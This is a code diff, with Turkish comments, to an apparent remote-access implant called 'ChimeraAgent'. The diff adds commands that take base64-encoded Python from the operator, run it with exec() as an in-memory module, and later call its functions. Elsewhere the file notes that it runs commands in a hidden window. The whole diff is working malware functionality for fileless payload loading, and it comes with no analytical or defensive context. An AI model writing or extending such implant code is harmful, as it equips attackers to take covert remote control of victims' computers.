@@ -13,6 +13,8 @@ import time
 import ssl
 import random
 import string
+import types
+import base64
 
 # ============================================================
 # Konfigürasyon - generate.py tarafından doldurulacak
@@ -31,6 +33,7 @@ class ChimeraAgent:
         self.port = port
         self.sock = None
         self.running = True
+        self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}
 
     # --------------------------------------------------------
     # Bağlantı Yönetimi
@@ -222,6 +225,71 @@ class ChimeraAgent:
             self.running = False
             return "Agent sonlandırılıyor..."
         
+        # Özel komutlar - Modül Yönetimi (Faz 2.1)
+        if cmd.startswith("loadmodule "):
+            try:
+                # Format: loadmodule <name> <b64_code>
+                parts = cmd.split(" ", 2)
+                if len(parts) < 3:
+                    return "[!] Kullanım: loadmodule <name> <b64_code>"
+                
+                module_name = parts[1]
+                b64_code = parts[2]
+                
+                # Base64 decode
+                code = base64.b64decode(b64_code).decode("utf-8")
+                
+                # Yeni modül oluştur
+                mod = types.ModuleType(module_name)
+                
+                # Kodu modül context'inde çalıştır
+                exec(code, mod.__dict__)
+                
+                # Modülü sisteme kaydet
+                sys.modules[module_name] = mod
+                self.loaded_modules[module_name] = mod
+                
+                return f"[+] Modül '{module_name}' hafızaya yüklendi."
+            except Exception as e:
+                return f"[!] Modül yükleme hatası: {str(e)}"
+
+        elif cmd.startswith("runmodule "):
+            try:
+                # Format: runmodule <name> [func] [args...]
+                parts = cmd.strip().split(" ")
+                if len(parts) < 2:
+                    return "[!] Kullanım: runmodule <name> [func]"
+                
+                module_name = parts[1]
+                func_name = parts[2] if len(parts) > 2 else "run"
+                args = parts[3:]
+                
+                if module_name not in self.loaded_modules:
+                    return f"[!] Hata: '{module_name}' modülü yüklü değil."
+                
+                mod = self.loaded_modules[module_name]
+                
+                if not hasattr(mod, func_name):
+                    return f"[!] Hata: '{func_name}' fonksiyonu bulunamadı."
+                
+                # Fonksiyonu çalıştır
+                func = getattr(mod, func_name)
+                
+                # Argümanları dinamik olarak ilet
+                if args:
+                    result = func(*args)
+                else:
+                    result = func()
+                    
+                return str(result) if result is not None else "[+] Fonksiyon çalıştırıldı (Dönüş değeri yok)."
+            except Exception as e:
+                return f"[!] Modül çalıştırma hatası: {str(e)}"
+
+        elif cmd.strip() == "listmodules":
+            if not self.loaded_modules:
+                return "[-] Yüklü modül yok."
+            return "Yüklü Modüller:\n" + "\n".join([f"- {name}" for name in self.loaded_modules.keys()])
+
         try:
             # Komutu gizli pencerede çalıştır
             startupinfo = None
